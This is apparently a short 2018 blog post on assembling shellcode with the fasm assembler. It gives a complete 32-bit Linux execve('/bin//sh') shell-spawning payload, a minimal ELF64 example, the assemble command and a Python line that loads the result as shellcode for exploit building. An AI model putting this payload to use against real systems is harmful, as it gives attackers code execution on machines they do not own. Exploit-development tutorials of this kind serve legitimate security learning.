---
layout: post
title: "writing shellcode using fasm"
date: 2018-09-01 14:01:00 -0500
published: true
---

```
apt install fasm -y
```

```
; fasm example: this generates raw instruction in a file
; x86_32 shellcode
format binary
use32 ; 32b
    xor    eax,eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    push   eax
    push   ebx
    mov    ecx,esp
    mov    al,0xb
    int    0x80
```

```
; this generates a runnable executable
format ELF64 executable
use64
    push 0x20
    jmp  QWORD [rsp]
```

```
# assemble it
fasm blah.asm blah.bin
```

```
# you can read it into python, if you're constructing shellcode
with open("blah.bin") as f:
    shellcode = f.read()
```

